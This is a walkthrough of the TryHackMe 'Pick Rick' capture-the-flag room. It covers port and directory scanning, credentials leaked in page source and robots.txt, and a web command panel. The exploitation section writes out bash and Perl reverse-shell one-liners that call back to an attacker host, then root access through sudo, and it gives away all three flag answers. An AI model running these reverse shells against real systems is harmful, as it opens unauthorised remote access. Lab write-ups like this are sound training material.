This is a detailed walkthrough of tryhackme CTF title Pick Rick: This Rick and Morty-themed CTF revolves around exploiting a vulnerable web server to find three ingredients to transform Rick from a pickle back to human state.

## Scanning

First off, let's store the target IP as a variable for easy access.

Command: export ip=xx.xx.xx.xx

Next, let's run an nmap scan on the target IP:
```bash
nmap -A -v $ip -oN nmap.txt
```

Command break down:

-A: This flag enables aggressive scanning. It combines various scan types (like OS detection, version detection, script scanning, and traceroute) into a single scan.

-v: increases verbosity, providing more detailed output during the scan.

—$ip: provides the target IP we stored as the variable $ip.

-oN nmap.txt: This option specifies normal output that should be saved to a file named “nmap.txt.

This scan reveals two open ports:

![nmap_result](https://github.com/user-attachments/assets/9cffca0f-cd9d-44e0-99eb-7bd522615f25)

# Enumeration

### **Analysis Port 80/TCP**

Let's check out the websever on port 80/TCP.

I checked the source code and revealed a username in the html comments:

![pagesource](https://github.com/user-attachments/assets/23742b21-e765-47e8-8788-cc3d68224727)


Now let's run a directory scan on the target using gobuster:

```bash
gobuster dir -u $ip -w=/usr/share/wordlists/dirb/common.txt -x txt,php,html -o buster.txt
```
Command break down:

dir: Specifies that we want to perform directory brute-forcing.

-u $ip: The -u flag followed by the target IP address or hostname indicates the URL to scan.

-w=/usr/share/wordlists/dirb/common.txt: This option specifies the wordlist to use for directory brute-forcing. In this case, it uses the common wordlist located at /usr/share/wordlists/dirb/common.txt.

-x txt,php,html: The -x flag specifies file extensions to search for. Here, we’re looking for files with extensions .txt, .php, and .html.

-o buster.txt: The -o flag specifies the output file where the results will be saved. In this case, it saves the output to a file named “buster.txt.”

We found two juicy directories:
![buster](https://github.com/user-attachments/assets/005f3530-538e-4fb7-a809-9c0379e1e99b)

```bash
/login.php
/robots.txt
```
Let's also run a nikto scan on the target IP:

```bash
nikto -h $ip | tee nikto.txt
```
Command break down:
-h $ip: The -h option specifies the target host
| tee nikto.txt: The tee command allows you to save the output to a file (nikto.txt) 
![nikto](https://github.com/user-attachments/assets/2be2bf43-af1f-4a72-929a-76fdcbce784f)

This again reveals the /login.php directory among other information.

Browsing to /login.php , we are redirect to a log in page :

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2cc435b8-98c2-4a31-a765-4ed3bf419ef2/Untitled.png)

Browsing to /robots.txt , we are redirect to a html page with this word (We assume it's the passowrd):

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/764766a5-6642-47fa-bc16-76487e4cf2f0/Untitled.png)

Credential :

Username: **R1ckRul3s**

Password: xxxxxxxxxxx

# Gaining privileges

We go back to {IP}/login.phop  and i use as Username: **R1ckRul3s and as** Password: xxxxxxxxxxx

We can successfully log in: 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c5cc2faf-1fb8-46e7-988a-43de3d52ec71/Untitled.png)

We're presente with a command pannel:

Running the command 

```bash
ls
```

we can see all the above showed assets , trying to 

```bash
cat
```

these file, will results in 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/23064ade-f915-459b-91d5-010f9b8c40ec/Untitled.png)

# Expolitation

We need to use a shell, in order to gain privileges in the victimes envirolment:

As main resources i used [https://ironhackers.es/en/herramientas/reverse-shell-cheat-sheet/](https://ironhackers.es/en/herramientas/reverse-shell-cheat-sheet/)

1st attempt:

****Reverse Shell- Bash shell****

Following the documentation on the Attacker machine i opened the port 8080 to listen

```bash
nc -lvp 8080
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/557467c1-42c4-4413-b59b-425c731a7a52/Untitled.png)

On the Victim machine i run the  command:

```bash
bash -i >& /dev/tcp/xx.xx.xx.xx/8080 0>&1
```

## Nothin happen, Test failed

2ndAttempt

****Reverse Shell- Perl shell****

Following the documentation on the Attacker machine i opened the port 8080 to listen

```bash
nc -lvp 1234
```

On the Victim machine i run the  command:

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

We gain access to the machine:

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/df773578-cceb-4bb0-81aa-5ec70742539b/Untitled.png)

Browsing the file system , now we can 

```bash
cat "Sup3rS3cretPickl3Ingred.txt"
```

### The First ingredients is : mr meeseek hair

When i 

```bash
pwd
```

it return 

```bash
pwd
var/www/html
```

The current user is :  www-data

going back in the folder hierarchy i go to 

```bash
/home
```

I can see:

```bash
rick 
ubunutu
```

I want to explore rick folder:

```bash
cd /home/rick
```

we found the second ingredients is Jerry Tear

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f8be9229-9436-4f9c-a0c1-f03a818f97c7/Untitled.png)

At this point i want to access the root folder and gain full privileges.

I tried with 

```bash
sudo su 
```

Luckly it work, by acceding the root folder 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6a48134a-1a8b-4992-a10f-57381559a96e/Untitled.png)

In the /root folder wel'’find the 3rd ingredient :

```bash
cat 3rd.txt
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3dced013-95e7-4aca-b82b-929c7885cc14/Untitled.png)

The 3rd ingredients is fleeb Juice
